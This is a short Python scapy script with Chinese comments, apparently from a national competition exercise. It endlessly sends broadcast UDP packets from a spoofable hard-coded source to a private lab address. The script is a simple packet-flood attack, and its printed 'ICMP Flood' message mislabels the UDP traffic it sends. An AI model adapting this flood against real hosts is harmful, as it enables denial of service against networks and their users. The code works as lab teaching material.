# -*- codeing = utf-8 -*-
# 时间:2021/11/29 19:30
# 作者:CK
# 文件名:18国赛第二阶段.py
# 开发环境:PyCharm
from scapy.all import *#导入scapy模块和所有功能
import time#导入time模块

ethernet=Ether()#将以太网的协议放入ethernet这个变量里
ip=IP()#将IP协议放入ip里
udp=UDP()#将UDP协议放进udp里
floodp=ethernet/ip/udp#将以太网、IP、UDP三层协议的组合放进floodp中
floodp[Ether].dst='ff:ff:ff:ff:ff:ff'#表示以太网所有的目的地址
floodp[Ether].src=get_if_hwaddr('eth0')#获取本地网卡eth0的物理地址
floodp[Ether].type=0x800#以太网的类型
floodp[IP].version=4#IPv4
floodp[IP].proto='udp'#使用UDP协议
floodp[IP].src='192.168.48.100'#源IP
floodp[IP].dst='192.168.48.39'#这里指目标IP
floodp[UDP].sport=1028#udp的源端口
floodp[UDP].dport=8000#udp的目的端口

while True:#无限循环
    sendp(floodp)#用scapy里的sendp函数发送这个数据包
    print('Sending ICMP Flood To Pyhsical Machine..............')#打印
    time.sleep(2)#每2秒输出循环一次